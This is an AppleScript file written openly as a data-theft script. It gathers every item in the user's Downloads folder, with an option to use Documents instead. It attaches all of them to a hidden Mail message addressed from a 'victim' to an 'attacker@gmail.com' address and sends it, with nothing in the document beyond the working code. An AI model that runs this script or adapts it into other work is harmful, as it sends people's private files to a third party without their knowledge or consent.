-- set myDocumentFolder to path to documents folder as string -- Documents folder
set myDocumentFolder to path to downloads folder as string -- Downloads folder

-- Find all files in the folder
tell application "Finder"
set folderPath to folder myDocumentFolder
tell application "Finder" to set attchList to (every item of folderPath) as alias list
end tell

-- Prepare email header and recipients
set msgText to "Files from Victim"
set theSender to "victim@gmail.com"
set recipName to "Attacker"
set recipAddress to "attacker@gmail.com"

-- send email
tell application "Mail"
set newmessage to make new outgoing message with properties {subject:"Important File Attachment", content:msgText & return & return, visible:false}
tell newmessage
set visible to false
set sender to theSender
make new to recipient with properties {name:recipName, address:recipAddress}
repeat with attach in attchList
make new attachment with properties {file name:(contents of attach)}
end repeat
set visible to true
end tell
send newmessage
end tell